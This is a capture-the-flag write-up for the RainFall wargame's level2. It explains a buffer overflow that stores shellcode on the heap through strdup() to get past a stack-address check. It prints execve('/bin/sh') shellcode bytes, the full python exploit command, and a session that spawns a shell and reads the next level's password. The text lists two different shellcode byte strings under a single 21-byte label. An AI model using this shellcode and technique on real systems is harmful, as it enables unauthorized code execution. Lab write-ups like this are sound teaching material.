📘 Buffer Overflow Exploit: Level 2
This level is a classic heap-based buffer overflow challenge — unlike Level 1, the program prevents us from returning to addresses on the stack. Instead, we need to use the heap for our shellcode execution.

⚠️ Vulnerability Summary
The program uses the unsafe gets() function, which does not check input size.

The input is copied into a buffer on the stack, but a check prevents the return address from pointing to the stack (addresses starting with 0xb).

However, the input is later duplicated with strdup(), which allocates memory on the heap.

This means the shellcode can be stored in the heap, and the return address overwritten to point there — bypassing the stack restriction.

🧠 Our Goal
We want to:
1.Write shellcode as input (stored in the heap by strdup()).
2.Overwrite the saved return address on the stack to point to the heap address returned by malloc.
3.When the function returns, it jumps to our shellcode in the heap, giving us a shell.

🔎 Understanding the Program Behavior
Using ltrace, the heap address returned by strdup() is always 0x0804a008.

The vulnerable function calls gets() to read input, then strdup() to duplicate it.

We want the return address to be 0x0804a008 so it jumps to our shellcode in the heap.

🛠 Finding the Offset to EIP (Return Address)
Using gdb and a pattern of known characters:

```
level2@RainFall:~$ gdb level2
(gdb) run
Starting program: ./level2
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4
Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
"6A7c"
(gdb) info register eip
eip            0x37634136       0x37634136
The pattern shows the return address is overwritten starting at offset 80 bytes.

So we need to fill 80 bytes before the return address.

💡 Crafting the Payload
Our payload layout:

Part	Size (bytes)	Description
Shellcode	21	The actual shellcode (execve("/bin/sh"))
Padding ("A")	59	Filler bytes to reach the return address
Return Address	4	Overwrite with 0x0804a008 (heap shellcode addr)

Shellcode (21 bytes):
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
https://shell-storm.org/shellcode/files/shellcode-752.html

Final Exploit Command
python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit

cat /tmp/exploit - | ./level2
✅ What Happens?
The shellcode is stored in the heap at 0x0804a008.

The return address is overwritten to jump there.

When the function returns, execution jumps to our shellcode in the heap.

We get a shell as user level3.

From there, we can read the next password file.

Example session:
bash
Copier
Modifier
level2@RainFall:~$ cat /tmp/exploit - | ./level2
j
 XRh//shh/bin1̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
Summary
The program disallows returning to stack addresses to prevent stack shellcode.

We used the heap allocation from strdup() to store shellcode.

We overwrote the return address with the heap address to gain control.

Successfully escalated to level3.